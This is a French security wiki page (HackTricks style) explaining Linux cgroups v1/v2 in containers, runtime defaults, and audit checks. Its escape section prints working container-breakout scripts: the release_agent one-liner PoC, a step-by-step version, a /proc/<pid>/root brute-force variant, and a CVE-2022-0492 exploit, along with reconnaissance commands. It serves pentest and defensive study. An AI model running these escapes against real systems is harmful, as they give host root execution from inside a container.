# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Aperçu

Linux **control groups** sont le mécanisme du noyau utilisé pour regrouper les processus pour la comptabilité, la limitation, la priorisation et l'application des politiques. Si les namespaces visent surtout à isoler la vue des ressources, les cgroups visent surtout à gouverner **combien** de ces ressources un ensemble de processus peut consommer et, dans certains cas, **avec quelles catégories de ressources** ils peuvent interagir.

Containers s'appuient constamment sur les cgroups, même lorsque l'utilisateur ne les regarde jamais directement, parce que presque chaque runtime moderne a besoin d'un moyen pour dire au noyau "ces processus appartiennent à cette charge de travail, et voici les règles de ressources qui s'appliquent à eux".

C'est pourquoi les container engines placent un nouveau container dans son propre cgroup subtree. Une fois l'arbre de processus en place, le runtime peut limiter la mémoire, restreindre le nombre de PIDs, pondérer l'utilisation du CPU, réguler l'I/O et restreindre l'accès aux devices. En production, cela est essentiel à la fois pour la sécurité multi-tenant et pour une hygiène opérationnelle basique. Un container sans contrôles de ressources significatifs peut épuiser la mémoire, inonder le système de processus ou monopoliser le CPU et l'I/O d'une manière qui rend l'hôte ou les workloads voisins instables.

D'un point de vue sécurité, les cgroups importent de deux manières distinctes. Premièrement, des limites de ressources mal configurées ou absentes permettent des attaques de déni de service simples. Deuxièmement, certaines fonctionnalités de cgroup, surtout dans les anciens environnements **cgroup v1**, ont historiquement créé des primitives de breakout puissantes lorsqu'elles étaient modifiables depuis l'intérieur d'un container.

## v1 Vs v2

Il existe deux modèles cgroup majeurs en production. **cgroup v1** expose plusieurs hiérarchies de contrôleurs, et les anciens exploit writeups tournent souvent autour des sémantiques étranges et parfois excessivement puissantes disponibles là-bas. **cgroup v2** introduit une hiérarchie plus unifiée et un comportement généralement plus propre. Les distributions modernes privilégient de plus en plus cgroup v2, mais les environnements mixtes ou legacy existent encore, ce qui signifie que les deux modèles restent pertinents lors de l'examen de systèmes réels.

La différence est importante parce que certaines des histoires de breakout de container les plus célèbres, comme les abus de **`release_agent`** dans cgroup v1, sont très liées au comportement des anciens cgroups. Un lecteur qui voit un exploit cgroup sur un blog puis l'applique aveuglément à un système moderne uniquement cgroup v2 risque de mal comprendre ce qui est réellement possible sur la cible.

## Inspection

La façon la plus rapide de voir où se situe votre shell actuel est :
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Le fichier `/proc/self/cgroup` affiche les chemins cgroup associés au processus courant. Sur un hôte moderne cgroup v2, vous verrez souvent une entrée unifiée. Sur des hôtes plus anciens ou hybrides, vous pouvez voir plusieurs chemins de contrôleur v1. Une fois que vous connaissez le chemin, vous pouvez inspecter les fichiers correspondants sous `/sys/fs/cgroup` pour voir les limites et l'utilisation actuelle.

Sur un hôte cgroup v2, les commandes suivantes sont utiles :
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Ces fichiers révèlent quels contrôleurs existent et lesquels sont délégués aux cgroups enfants. Ce modèle de délégation est important dans les environnements rootless et gérés par systemd, où le runtime peut seulement être en mesure de contrôler le sous-ensemble de la fonctionnalité cgroup que la hiérarchie parente délègue réellement.

## Lab

Une façon d'observer les cgroups en pratique est d'exécuter un conteneur limité en mémoire :
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Vous pouvez aussi essayer un PID-limited container:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Ces exemples sont utiles car ils permettent de relier le flag du runtime à l'interface de fichiers du noyau. Le runtime n'applique pas la règle par magie ; il écrit les paramètres cgroup pertinents puis laisse le noyau les faire respecter sur l'arbre des processus.

## Utilisation du runtime

Docker, Podman, containerd et CRI-O s'appuient tous sur les cgroups dans le fonctionnement normal. Les différences portent généralement non pas sur l'utilisation des cgroups, mais sur **les valeurs par défaut qu'ils choisissent**, **la manière dont ils interagissent avec systemd**, **le fonctionnement de la délégation rootless**, et **la part de la configuration contrôlée au niveau du moteur par rapport au niveau de l'orchestration**.

Dans Kubernetes, les demandes et limites de ressources finissent par devenir une configuration cgroup sur le nœud. Le chemin allant du Pod YAML à l'application par le noyau passe par le kubelet, le CRI runtime et l'OCI runtime, mais les cgroups restent le mécanisme du noyau qui applique finalement la règle. Dans les environnements Incus/LXC, les cgroups sont également largement utilisés, notamment parce que les conteneurs système exposent souvent un arbre de processus plus riche et des attentes opérationnelles plus proches de celles d'une VM.

## Mauvaises configurations et échappements

Le récit classique de sécurité des cgroups est le mécanisme **cgroup v1 `release_agent`** modifiable en écriture. Dans ce modèle, si un attaquant peut écrire dans les bons fichiers cgroup, activer `notify_on_release` et contrôler le chemin stocké dans `release_agent`, le noyau peut finir par exécuter un chemin choisi par l'attaquant dans les namespaces initiaux de l'hôte lorsque le cgroup devient vide. C'est pourquoi les anciennes analyses accordent tant d'attention à la permissivité en écriture des contrôleurs cgroup, aux options de montage et aux conditions de namespace/capability.

Même lorsque `release_agent` n'est pas disponible, les erreurs de cgroup comptent toujours. Un accès aux périphériques trop large peut rendre les périphériques de l'hôte accessibles depuis le conteneur. L'absence de limites mémoire et PID peut transformer une simple exécution de code en un DoS de l'hôte. Une délégation de cgroup faible dans des scénarios rootless peut aussi induire en erreur les défenseurs, qui supposent l'existence d'une restriction alors que le runtime n'a en réalité jamais pu l'appliquer.

### Contexte de `release_agent`

La technique `release_agent` ne s'applique qu'à **cgroup v1**. L'idée de base est que lorsque le dernier processus d'un cgroup termine et que `notify_on_release=1` est défini, le noyau exécute le programme dont le chemin est stocké dans `release_agent`. Cette exécution a lieu dans les **namespaces initiaux de l'hôte**, ce qui transforme un `release_agent` modifiable en écriture en une primitive d'évasion de conteneur.

Pour que la technique fonctionne, l'attaquant a généralement besoin de :

- une hiérarchie **cgroup v1** modifiable en écriture
- la capacité de créer ou d'utiliser un cgroup enfant
- la possibilité de définir `notify_on_release`
- la possibilité d'écrire un chemin dans `release_agent`
- un chemin qui se résout en un exécutable du point de vue de l'hôte

### PoC classique

Le PoC historique en one-liner est :
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Cette PoC écrit un chemin de payload dans `release_agent`, déclenche la libération du cgroup, puis lit le fichier de sortie généré sur l'hôte.

### Explication pas à pas

La même idée est plus facile à comprendre lorsqu'elle est découpée en étapes.

1. Créer et préparer un cgroup accessible en écriture:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifier le chemin sur l'hôte correspondant au système de fichiers du conteneur :
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Déposer un payload qui sera visible depuis le chemin de l'hôte :
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Déclencher l'exécution en vidant le cgroup :
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
L'effet est une exécution côté host du payload avec les privilèges root de l'host. Dans un exploit réel, le payload écrit généralement un fichier de preuve, lance une reverse shell, ou modifie l'état de l'host.

### Variante de chemin relatif utilisant `/proc/<pid>/root`

Dans certains environnements, le host path vers le container filesystem n'est pas évident ou est caché par le storage driver. Dans ce cas le payload path peut être exprimé via `/proc/<pid>/root/...`, où `<pid>` est un host PID appartenant à un processus dans le container courant. C'est la base de la variante relative-path brute-force :
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
L'astuce pertinente ici n'est pas le brute force lui-même mais la forme du chemin : `/proc/<pid>/root/...` permet au noyau de résoudre un fichier à l'intérieur du système de fichiers du conteneur depuis l'espace de noms de l'hôte, même lorsque le chemin de stockage direct sur l'hôte n'est pas connu à l'avance.

### CVE-2022-0492 Variante

En 2022, CVE-2022-0492 a montré que l'écriture dans `release_agent` sous cgroup v1 ne vérifiait pas correctement la présence de `CAP_SYS_ADMIN` dans l'espace de noms utilisateur **initial**. Cela rendait la technique beaucoup plus accessible sur les noyaux vulnérables, car un processus dans un conteneur capable de monter une hiérarchie cgroup pouvait écrire dans `release_agent` sans déjà être privilégié dans l'espace de noms utilisateur de l'hôte.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Sur un noyau vulnérable, l'hôte exécute `/proc/self/exe` avec les privilèges root de l'hôte.

Pour un abus pratique, commencez par vérifier si l'environnement expose encore des chemins cgroup-v1 inscriptibles ou un accès dangereux aux périphériques:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Si `release_agent` est présent et accessible en écriture, vous êtes déjà en territoire legacy-breakout :
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Si le cgroup path lui-même ne permet pas d'escape, l'utilisation pratique suivante est souvent denial of service ou reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Ces commandes indiquent rapidement si la charge de travail a la capacité de fork-bomb, de consommer la mémoire de façon agressive, ou d'exploiter une interface cgroup héritée modifiable en écriture.

## Checks

Lors de l'analyse d'une cible, l'objectif des vérifications cgroup est de déterminer quel modèle de cgroup est utilisé, si le conteneur voit des chemins de contrôleur modifiables en écriture, et si d'anciennes primitives de breakout telles que `release_agent` sont même pertinentes.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Ce qui est intéressant ici :

- Si `mount | grep cgroup` affiche **cgroup v1**, les breakout writeups plus anciens deviennent plus pertinents.
- Si `release_agent` existe et est reachable, cela mérite immédiatement une analyse plus approfondie.
- Si la hiérarchie cgroup visible est writable et que le container a aussi de fortes capabilities, l'environnement mérite un examen beaucoup plus approfondi.

Si vous découvrez **cgroup v1**, des montages de contrôleurs writables, et un container qui possède également de fortes capabilities ou une protection seccomp/AppArmor faible, cette combinaison mérite une attention particulière. Les cgroups sont souvent traités comme un sujet ennuyeux de gestion des ressources, mais historiquement ils ont fait partie de certaines des plus instructives container escape chains, précisément parce que la frontière entre "resource control" et "host influence" n'était pas toujours aussi nette qu'on le supposait.

## Paramètres par défaut du runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut | Les containers sont placés dans des cgroups automatiquement ; les limites de ressources sont optionnelles sauf si définies avec des flags | omettre `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Activé par défaut | `--cgroups=enabled` est le défaut ; les defaults du namespace cgroup varient selon la version de cgroup (`private` sur cgroup v2, `host` sur certaines configurations cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, accès device assoupli, `--privileged` |
| Kubernetes | Activé via le runtime par défaut | Les Pods et containers sont placés dans des cgroups par le runtime du nœud ; le contrôle granulaire des ressources dépend de `resources.requests` / `resources.limits` | omission des resource requests/limits, accès device privilégié, misconfiguration du runtime au niveau hôte |
| containerd / CRI-O | Activé par défaut | Les cgroups font partie de la gestion normale du cycle de vie | configs runtime directes qui assouplissent les contrôles des devices ou exposent des legacy writable cgroup v1 interfaces |

La distinction importante est que l'**existence des cgroups** est généralement activée par défaut, tandis que les **contraintes de ressources utiles** sont souvent optionnelles sauf si elles sont configurées explicitement.
{{#include ../../../../banners/hacktricks-training.md}}
